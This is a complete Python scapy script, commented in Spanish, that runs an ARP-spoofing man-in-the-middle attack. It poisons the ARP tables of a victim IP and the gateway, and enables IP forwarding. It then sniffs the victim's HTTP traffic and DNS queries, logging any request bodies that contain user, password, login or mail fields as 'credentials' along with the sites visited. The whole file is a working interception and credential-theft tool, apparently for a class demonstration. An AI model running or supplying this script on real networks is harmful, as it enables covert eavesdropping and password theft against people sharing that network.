import scapy.all as scapy
from scapy.layers import http
import time
import sys
import os
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

ultima_visita_pantalla = None

def escribir_log(contenido):
    with open("log.txt", "a") as f:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] {contenido}\n")

def get_mac(ip, iface):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, iface=iface, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip, iface):
    dest_mac = get_mac(dest_ip, iface)
    source_mac = get_mac(source_ip, iface)
    if dest_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

def process_packet(packet):
    global ultima_visita_pantalla
    sitio_detectado = None
    tipo_trafico = ""

    if packet.haslayer(http.HTTPRequest):
        sitio_detectado = packet[http.HTTPRequest].Host.decode(errors="ignore")
        tipo_trafico = "WEB HTTP"
        
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode(errors="ignore")
            if any(key in load.lower() for key in ["user", "pass", "login", "mail"]):
                msg_creds = f"[*** CREDENCIALES ***] {load}"
                print(f"\n{msg_creds}")
                escribir_log(msg_creds)

    elif packet.haslayer(scapy.DNSQR) and packet[scapy.DNS].ancount == 0:
        sitio_detectado = packet[scapy.DNSQR].qname.decode(errors="ignore").strip('.')
        tipo_trafico = "DNS/SITIO"

    if sitio_detectado:
        escribir_log(f"[{tipo_trafico}] {sitio_detectado}")

        if sitio_detectado != ultima_visita_pantalla:
            if not any(x in sitio_detectado for x in ["google-analytics", "static", "metrics"]):
                print(f"[*] La victima entró en: {sitio_detectado}")
                ultima_visita_pantalla = sitio_detectado

target_ip = input("[+] Introduce la IP de la victima: ")
gateway_ip = "192.168.0.1"
interface = "eth0"

try:
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    print("[*] Iniciando entorno...")
    t_mac = get_mac(target_ip, interface)
    g_mac = get_mac(gateway_ip, interface)
    
    if not t_mac or not g_mac:
        print("[-] Error: Asegúrate de que el objetivo esté conectado.")
        sys.exit()

    print(f"\n" + "═"*50)
    print(f"| MONITOR DE RED (SÓLO CAMBIOS EN PANTALLA)")
    print(f"| LOG COMPLETO EN: log.txt")
    print(f"| Objetivo: {target_ip}")
    print("═"*50 + "\n")

    while True:
        spoof(target_ip, gateway_ip, t_mac)
        spoof(gateway_ip, target_ip, g_mac)
        
        scapy.sniff(iface=interface, store=False, prn=process_packet, timeout=1)

except KeyboardInterrupt:
    print("\n\n[-] Finalizando clase. Restaurando tablas ARP...")
    restore(target_ip, gateway_ip, interface)
    restore(gateway_ip, target_ip, interface)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[+] Proceso finalizado. El log contiene el 100% del tráfico.")